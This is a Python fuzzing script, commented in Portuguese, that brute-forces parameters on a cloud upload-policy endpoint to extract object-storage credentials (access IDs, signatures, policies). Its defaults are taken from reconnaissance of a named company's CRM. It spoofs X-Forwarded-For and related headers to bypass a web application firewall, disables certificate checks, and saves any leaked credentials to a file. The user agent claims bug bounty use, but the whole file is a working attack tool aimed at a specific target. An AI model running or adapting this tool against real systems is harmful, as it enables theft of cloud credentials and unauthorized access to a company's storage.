import requests
import json
import argparse
import time
import sys
import urllib3
from colorama import Fore, Style, init

# Configurações Iniciais
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- INTELIGÊNCIA EMBUTIDA (Baseada na sua recon) ---
# Extraído de api.js e resposta_js_link_extractor_generic.txt
DEFAULT_VALUES = [
    # Genéricos de Upload
    "common", "image", "file", "video", "audio", "media", "doc", "excel",
    "avatar", "feedback", "report", "template", "upload", "temp", "public",
    
    # Específicos Starbucks/CRM (Extraídos dos seus arquivos)
    "poster", "welcomemsg", "material", "moment", "course", "brand", 
    "chat", "broadcast", "crm", "shop", "product", "order", "certificate", 
    "license", "knowledge", "lead", "dashboard", "monitor", "lbs", 
    "activity", "coupon", "member", "rpa", "yiwise", "dazhuanpan", 
    "blind-box", "fission", "survey", "checkin", "group-fission"
]

DEFAULT_KEYS = [
    "type", "fileType", "category", "bizType", "module", "scene", "usage",
    "business", "uploadType", "bucket", "dir", "prefix", "scope", "kind"
]

DEFAULT_EXTENSIONS = {
    "image": [".jpg", ".png"],
    "video": [".mp4"],
    "excel": [".xlsx", ".xls", ".csv"],
    "doc": [".pdf", ".docx"],
    "default": [".xlsx"] # O mais seguro para ambientes corporativos
}

def get_args():
    parser = argparse.ArgumentParser(description="OSS Policy Fuzzer Pro - Extrator de Credenciais de Nuvem")
    
    parser.add_argument("-u", "--url", required=True, help="URL do endpoint de Policy")
    parser.add_argument("-i", "--ip", help="IP para Bypass de WAF (X-Forwarded-For)")
    parser.add_argument("-w", "--wordlist", help="Arquivo com lista de valores (business types) personalizados")
    parser.add_argument("-k", "--keys", help="Arquivo com lista de chaves (parâmetros) personalizadas")
    parser.add_argument("-d", "--delay", type=float, default=0.2, help="Delay entre requisições (s)")
    parser.add_argument("-o", "--output", default="oss_success.txt", help="Arquivo para salvar credenciais")
    parser.add_argument("--proxy", help="Proxy (ex: http://127.0.0.1:8080)")
    
    return parser.parse_args()

def load_list(filepath, default):
    if not filepath: return default
    try:
        with open(filepath, 'r') as f:
            return [l.strip() for l in f if l.strip()]
    except:
        print(f"{Fore.RED}[!] Erro ao abrir wordlist {filepath}. Usando padrão.")
        return default

def get_extension_for_value(val):
    """Tenta adivinhar a extensão correta baseada no nome do valor"""
    val = val.lower()
    if "img" in val or "image" in val or "avatar" in val or "poster" in val:
        return DEFAULT_EXTENSIONS["image"][0]
    elif "video" in val:
        return DEFAULT_EXTENSIONS["video"][0]
    elif "pdf" in val or "doc" in val:
        return DEFAULT_EXTENSIONS["doc"][0]
    else:
        return DEFAULT_EXTENSIONS["default"][0]

def main():
    args = get_args()
    
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    
    headers = {
        "User-Agent": "Mozilla/5.0 (BugBountyToolkit/OSS-Pro)",
        "Referer": args.url.split("/rest")[0] if "/rest" in args.url else args.url,
        "Content-Type": "application/json"
    }
    
    if args.ip:
        headers.update({
            "X-Forwarded-For": args.ip,
            "X-Originating-IP": args.ip,
            "X-Real-IP": args.ip
        })

    # Carrega Listas
    keys = load_list(args.keys, DEFAULT_KEYS)
    values = load_list(args.wordlist, DEFAULT_VALUES)

    print(f"{Fore.CYAN}[*] Iniciando Fuzzing Pro em: {Style.BRIGHT}{args.url}")
    print(f"{Fore.CYAN}[*] IP Bypass: {Fore.GREEN}{args.ip if args.ip else 'Inativo'}")
    print(f"{Fore.CYAN}[*] Total de Combinações: {len(keys) * len(values) * 2}")

    # Baseline (Erro Padrão)
    print(f"\n{Fore.YELLOW}[*] Identificando erro padrão...")
    baseline_msg = ""
    try:
        r = requests.post(args.url, json={"fileName":"test.txt"}, headers=headers, verify=False, proxies=proxies, timeout=5)
        baseline_msg = r.text
        print(f"{Fore.LIGHTBLACK_EX}    Resposta Baseline: {baseline_msg[:60]}...")
    except Exception as e:
        print(f"{Fore.RED}[!] Falha na conexão inicial: {e}")
        sys.exit(1)

    print(f"{Fore.GREEN}[+] Ataque iniciado! (Ctrl+C para parar)\n")

    found = False
    
    try:
        for key in keys:
            if found: break
            for val in values:
                # Inteligência: Escolhe a extensão baseada no tipo que estamos testando
                ext = get_extension_for_value(val)
                filename = f"report_2025{ext}"
                
                # Payload 1: Simples
                payloads = [
                    { "fileName": filename, key: val }
                ]
                
                # Payload 2: Com diretório (Alguns OSS exigem isso)
                payloads.append({ "fileName": filename, key: val, "dir": f"{val}/" })

                for p in payloads:
                    try:
                        r = requests.post(args.url, json=p, headers=headers, verify=False, proxies=proxies, timeout=3)
                        
                        # 1. Sucesso Absoluto (Credentials Leak)
                        if "accessid" in r.text.lower() or "signature" in r.text.lower() or "policy" in r.text.lower():
                            print(f"\n\n{Fore.GREEN}==========================================")
                            print(f"{Fore.GREEN}[!!!] JACKPOT - CREDENCIAIS ENCONTRADAS [!!!]")
                            print(f"{Fore.GREEN}==========================================")
                            print(f"{Fore.YELLOW}Payload: {json.dumps(p)}")
                            print(f"{Fore.WHITE}Resposta: {r.text}")
                            
                            with open(args.output, "a") as f:
                                f.write(f"URL: {args.url}\nPayload: {json.dumps(p)}\nResponse: {r.text}\n\n")
                            print(f"\n{Fore.CYAN}[*] Salvo em {args.output}")
                            found = True
                            break

                        # 2. Resposta Anômala (Diferente do erro padrão "Formato incorreto")
                        # Ignora erros de timestamp ou IDs de transação que mudam sempre
                        clean_resp = r.text.split("timestamp")[0]
                        clean_base = baseline_msg.split("timestamp")[0]
                        
                        if r.status_code == 200 and clean_resp != clean_base:
                             # Se o tamanho for muito diferente ou a mensagem mudar
                             if "格式" not in r.text and "format" not in r.text:
                                print(f"\n{Fore.BLUE}[?] Resposta Interessante ({key}={val}):")
                                print(f"{Fore.LIGHTBLUE_EX}    Msg: {r.text[:100]}...")

                    except Exception:
                        pass
                    
                    # Barra de progresso visual
                    print(f"\r{Fore.LIGHTBLACK_EX}Testando: {key}={val} [{ext}]", end="")
                    time.sleep(args.delay)

    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrompido.")

    if not found:
        print(f"\n{Fore.RED}[-] Fuzzing finalizado sem credenciais.")

if __name__ == "__main__":
    main()
